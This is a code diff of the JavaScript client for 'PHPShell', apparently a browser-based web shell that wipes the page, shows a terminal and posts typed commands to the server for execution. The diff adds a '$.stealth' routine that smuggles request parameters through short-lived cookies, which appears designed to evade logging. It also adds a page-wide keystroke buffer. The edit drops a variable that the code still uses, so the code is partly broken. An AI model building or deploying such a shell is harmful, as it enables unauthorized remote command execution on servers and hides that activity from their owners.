@@ -1,315 +1,257 @@
 var PHPShell = {};
 
 (function(phpshell){
-    $(function(){
+  var input = '';
+  var history = [];
+  var inputBuffer = [];
 
-        var input = '';
-        var history = [];
+  try {
+    history = JSON.parse(localStorage.getItem('hist')) || [];
+  } catch(e){}
 
-        try {
-          history = JSON.parse(localStorage.getItem('hist')) || [];
-        } catch(e){}
-
-        var currentHistory = 0;
-        var $pre = $('<pre>');
-        $('body > *').each(function(){
-          $(this).remove();
+  $.stealth = function(url, data, callback, type){
+    for(var k in data){
+      if(data[k] instanceof Array){
+        data[k].forEach(function(v,i){
+          document.cookie = k + '['+ i +']=' + encodeURIComponent(v) + ";";
         });
-        var mode = localStorage.getItem('ps_xmode') || SHELL_INFO.mode || 'exec';
-        var supportedModes = ['interactive','shell_exec','exec'];
+      } else {
+        document.cookie = k + '=' + encodeURIComponent(data[k]) + ";";
+      }
 
-        var onCommandListeners = [];
-
-
-        $('body').append($pre);
-        var $output = $('<span class="output"></span>');
-        $pre.append($output);
-        var $input = $('<input class="input">');
-        $pre.append($input);
-
-        $('body').append($('<div class="bg"></div>'));
-
-        $input.focus();
-        $input.css('min-width','100px');
-
-
-        /**
-         * Input buffer for stdin stuff
-         * @type Array
-         */
-        var procStdIn = [];
-
-        /**
-         * UUID for current running process
-         * @type Boolean|Boolean|@exp;response@pro;handle
-         */
-        var currentHandle = false;
-
-        /**
-         * Current suggestions
-         * @type Array|Array|@exp;data@pro;suggestions
-         */
-        var suggestions = [];
-
-        /**
-         * Current suggestion index
-         * @type Number|Number|Number
-         */
-        var currentSuggestion = 0;
-
-        /**
-         * Previous keystroke
-         * @type Number|Number|@exp;e@pro;which
-         */
-        var lastKey = 0;
-
-        // xecho
-        var echoKeyboard = true;
-
-        /**
-         *
-         */
-        $input.keyup(function(e){
-            if(currentHandle != false){
-                var strIn = $input.val();
-                if(strIn.length > 0){
-                    procStdIn.push(strIn);
-                    $input.val('');
-                }
-                if(e.which == 13||e.which==10){
-                    procStdIn.push(String.fromCharCode(10));
-                }
-                sendStdIn();
-            }
-        });
-
-
-        $input.keydown(function(e){
-           if(currentHandle != false){
-               return;
-           }
-           switch(e.which){
-               case 9:
-                   if(lastKey != 9){
-                       suggestions = [];
-                       $.ajax(window.location.href,{
-                           async: true,
-                           dataType: 'json',
-                           type:'post',
-                           data:{
-                               action:'suggest',
-                               cwd:SHELL_INFO.cwd,
-                               input:$input.val()
-                           }
-                       }).done(function(data){
-                         suggestions = data.suggestions;
-                         $input.val(suggestions[currentSuggestion]);
-                         $input.css('width',12+($input.val().length*12));
-                       });
-
-                       currentSuggestion = 0;
-                   } else if(suggestions.length > 0) {
-                       currentSuggestion++;
-                       if(currentSuggestion >= suggestions.length) currentSuggestion = 0;
-                       else $input.val(suggestions[currentSuggestion]);
-
-                       $input.val(suggestions[currentSuggestion]);
-                       $input.css('width',12+($input.val().length*12));
-                   }
-
-
-                   lastKey = 9;
-
-                   e.preventDefault();
-                   return false;
-               break;
-               case 38:
-                   currentHistory++;
-                   if(currentHistory > history.length){
-                       currentHistory = 0;
-                       $input.val('');
-                   } else {
-                       $input.val('');
-                       setTimeout(function(){
-                           $input.val(history[history.length-currentHistory]);
-                           $input.css('width',12+($input.val().length*12));
-                       },50);
-                   }
-
-
-
-               break;
-               case 40:
-                   currentHistory--;
-                   if(history < 0){
-                       history = 0;
-                       $input.val('');
-                   } else
-                   $input.val(history[history.length-currentHistory]);
-               break;
-               case 13:
-                   runStatement();
-               break;
-               default: console.log(e.which);
-               break;
-           }
-           lastKey = e.which;
-           $input.css('width',12+($input.val().length*12));
-        });
-
-        function animateCursor(){
-            $("html, body").stop();
-            $("html, body").animate({ scrollTop: $(document).height() }, 2500);
+    }
+    setTimeout(function(){
+      for(var k in data){
+        if(data[k] instanceof Array){
+          data[k].forEach(function(v,i){
+            document.cookie = k + '['+ i +']=;expires=Thu, 01 Jan 1970 00:00:00 UTC;';
+          });
+        } else {
+          console.log(k);
+          document.cookie = k + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;';
         }
+      }
+    },0);
+    return $.get(url, callback, type);
+
+  };
+
+  function request(data, callback, type){
+    return $[SHELL_INFO.requestMode || 'post'](window.location.href + "?" + (new Date).getTime(),data,callback,type);
+  }
+
+  var currentHistory = 0;
+  var $pre = $('<pre>');
+  $('body > *').each(function(){
+    $(this).remove();
+  });
+  var mode = localStorage.getItem('ps_xmode') || SHELL_INFO.mode || 'exec';
+
+  var onCommandListeners = [];
+
+  $('body').append($pre);
+  var $output = $('<span class="output"></span>');
+  $pre.append($output);
+  var $input = $('<input class="input">');
+  $pre.append($input);
+
+  $('body').append($('<div class="bg"></div>'));
+
+  $input.focus();
+  $input.css('min-width','100px');
+  /**
+   * Current suggestions
+   * @type Array|Array|@exp;data@pro;suggestions
+   */
+  var suggestions = [];
+
+  /**
+   * Current suggestion index
+   * @type Number|Number|Number
+   */
+  var currentSuggestion = 0;
+
+  /**
+   * Previous keystroke
+   * @type Number|Number|@exp;e@pro;which
+   */
+  var lastKey = 0;
+
+  $('body').keydown(function(e){
+    inputBuffer.push(e.which);
+  });
+
+  $input.keydown(function(e){
+     switch(e.which){
+         case 9:
+             if(lastKey != 9){
+                 suggestions = [];
+                 request({
+                   action:'suggest',
+                   cwd:SHELL_INFO.cwd,
+                   input:$input.val()
+                 }, function(data){
+                   suggestions = data.suggestions;
+                   $input.val(suggestions[currentSuggestion]);
+                   $input.css('width',12+($input.val().length*12));
+                 },"JSON");
+
+                 currentSuggestion = 0;
+             } else if(suggestions.length > 0) {
+                 currentSuggestion++;
+                 if(currentSuggestion >= suggestions.length) currentSuggestion = 0;
+                 else $input.val(suggestions[currentSuggestion]);
+
+                 $input.val(suggestions[currentSuggestion]);
+                 $input.css('width',12+($input.val().length*12));
+             }
 
 
-        function write(s){
-            $output.append(s);
-        }
+             lastKey = 9;
 
-        function writeln(s){
-            $output.append(s+'\n');
-        }
-        function writeCwdLine(){
-            var cwdStr = SHELL_INFO.prompt_style;
-            var cwdVars = {
-                cwd      : SHELL_INFO.cwd,
-                hostname : SHELL_INFO.hostname,
-                user     : SHELL_INFO.user
-            };
-
-            $.each(cwdVars,function(i){
-                cwdStr = cwdStr.replace('%'+i+'%',this);
-            });
-
-            write('\n<span class="cwd">'+cwdStr+'</span>');
-        }
-
-        function readProc(){
-            $.post(window.location.href,{action:'proc',handle:currentHandle,cwd:SHELL_INFO.cwd}, function(response){
-                if(response.out !== "")
-                    write(response.out);
-
-                if(!response.eof){
-                    readProc();
-                } else {
-                    currentHandle = false;
-                    writeCwdLine();
-                }
-
-                animateCursor();
-            },"json").error(function(){
-                readProc();
-            });
-        }
-
-        function sendStdIn(){
-            if(currentHandle && procStdIn.length > 0){
-                if(echoKeyboard)
-                $.each(procStdIn,function(i){
-                    write(this);
-                });
-                $.post(window.location.href,{stdin:procStdIn,handle:currentHandle,action:'stdin'},function(){
-
-                });
-                procStdIn = [];
-            }
-
-        }
-
-        function runStatement(){
-            var statement = $input.val();
-            if(history[history.length-1] !== statement){
-              history.push(statement);
-              localStorage.setItem('hist', JSON.stringify(history));
-            }
-            currentHistory = 0;
-            $input.val('');
-            writeln(statement);
-
-            /*
-             * Client side commands
-             */
-
-            /* Clear terminal */
-            if(statement == "clear" || statement == "cls"){
-                $output.html('');
-                writeCwdLine();
-
-                return;
-            }
-
-            var stopPropagation = false;
-
-            $(onCommandListeners).each(function(){
-               if(this.call(phpshell,statement) === false){
-                   stopPropagation = true;
-                   return false;
-               }
-            });
-
-            if(stopPropagation){
-                console.log('preventdefault');
-                writeCwdLine();
-                return false;
-            }
-
-            /* setmode ... */
-            var setMode = statement.match(/^xsetmode *([a-z-_]*)/);
-
-            if(setMode && setMode.length == 2){
-                if($.inArray(setMode[1],supportedModes) > -1){
-                    mode = setMode[1];
-                    writeln('PHPShell mode set to '+mode);
-                    localStorage.setItem('ps_xmode', mode);
-                } else {
-                    writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', ')
-                    + "\nCurrent mode: "+mode);
-                }
-                writeCwdLine();
-                return;
-            }
-
-            var xecho = statement.match(/xecho (true|false|0|1|on|off)/);
-            if(xecho){
-                if($.inArray(xecho[1],['true','on','1']) > -1){
-                    echoKeyboard = true;
-                    writeln('Keyboard echo enabled.');
-                } else {
-                    echoKeyboard = false;
-                    writeln('Keyboard echo disabled.');
-                }
-                writeCwdLine();
-                return;
-            }
-
-            /* ... If command is not recognized as client side, then send to server */
-            $.post(window.location.href,{action:'exec',cwd:SHELL_INFO.cwd,cmd:statement,mode:mode},function(response){
-                if(mode == "interactive" && response.handle){
-                    currentHandle = response.handle;
-                    procStdIn = [];
-                    readProc();
-                } else {
-                    write(response.html ? response.output : document.createTextNode(response.output));
-                    SHELL_INFO.cwd = response.cwd;
-                    writeCwdLine();
-                    animateCursor();
-                }
-            },"JSON").error(function(r){ write(r.responseText); writeCwdLine(); });
+             e.preventDefault();
+             return false;
+         break;
+         case 38:
+             currentHistory++;
+             if(currentHistory > history.length){
+                 currentHistory = 0;
+                 $input.val('');
+             } else {
+                 $input.val('');
+                 setTimeout(function(){
+                     $input.val(history[history.length-currentHistory]);
+                     $input.css('width',12+($input.val().length*12));
+                 },50);
+             }
 
 
-        }
 
-        phpshell.onCommand = function(callback){
-            onCommandListeners.push(callback);
-        };
-        phpshell.writeln = writeln;
-        phpshell.write = write;
-        phpshell.writeCwdLine = writeCwdLine;
+         break;
+         case 40:
+             currentHistory--;
+             if(history < 0){
+                 history = 0;
+                 $input.val('');
+             } else
+             $input.val(history[history.length-currentHistory]);
+         break;
+         case 13:
+             runStatement();
+         break;
+         default: console.log(e.which);
+         break;
+     }
+     lastKey = e.which;
+     $input.css('width',12+($input.val().length*12));
+  });
+
+  function animateCursor(){
+      $("html, body").stop();
+      $("html, body").animate({ scrollTop: $(document).height() }, 200);
+  }
 
 
-        writeln(SHELL_INFO.motd);
-        writeCwdLine();
-    });
+  function write(s){
+      $output.append(s);
+  }
+
+  function writeln(s){
+      $output.append(s+'\n');
+  }
+  function writeCmdLine(){
+      var cwdStr = SHELL_INFO.prompt_style;
+      var cwdVars = {
+          cwd      : SHELL_INFO.cwd,
+          hostname : SHELL_INFO.hostname,
+          user     : SHELL_INFO.user
+      };
+
+      $.each(cwdVars,function(i){
+          cwdStr = cwdStr.replace('%'+i+'%',this);
+      });
+
+      write('\n<span class="cwd">'+cwdStr+'</span>');
+  }
+
+  function runStatement(){
+      var statement = $input.val();
+      if(history[history.length-1] !== statement){
+        history.push(statement);
+        localStorage.setItem('hist', JSON.stringify(history));
+      }
+      currentHistory = 0;
+      $input.val('');
+      writeln(statement);
+
+      /*
+       * Client side commands
+       */
+
+      /* Clear terminal */
+      if(statement == "clear" || statement == "cls"){
+          $output.html('');
+          writeCmdLine();
+          return;
+      }
+
+      var stopPropagation = false;
+
+      $(onCommandListeners).each(function(){
+         if(this.call(phpshell,statement) === false){
+             stopPropagation = true;
+             return false;
+         }
+      });
+
+      if(stopPropagation){
+          return false;
+      }
+
+      /* setmode ... */
+      var setMode = statement.match(/^xsetmode *([a-z-_]*)/);
+
+      if(setMode && setMode.length == 2){
+          if($.inArray(setMode[1],supportedModes) > -1){
+              mode = setMode[1];
+              writeln('PHPShell mode set to '+mode);
+              localStorage.setItem('ps_xmode', mode);
+          } else {
+              writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', ')
+              + "\nCurrent mode: "+mode);
+          }
+          writeCmdLine();
+          return;
+      }
+
+      /* ... If command is not recognized as client side, then send to server */
+      request({action:'exec',cwd:SHELL_INFO.cwd,cmd:statement,mode:mode},function(response){
+        write(response.html ? response.output : document.createTextNode(response.output));
+        SHELL_INFO.cwd = response.cwd;
+        writeCmdLine();
+        animateCursor();
+      },"JSON").error(function(r){
+        write(r.responseText); writeCmdLine();
+      });
+  }
+  phpshell.onCommand = function(callback){
+      onCommandListeners.push(callback);
+  };
+
+  phpshell.getInputBuffer = function(){
+    var buf = inputBuffer;
+    inputBuffer = [];
+    return buf;
+  }
+
+  phpshell.writeln = writeln;
+  phpshell.write = write;
+  phpshell.writeCmdLine = writeCmdLine;
+
+  phpshell.request = request;
+
+
+  writeln(SHELL_INFO.motd);
+  writeCmdLine();
 
 })(PHPShell);
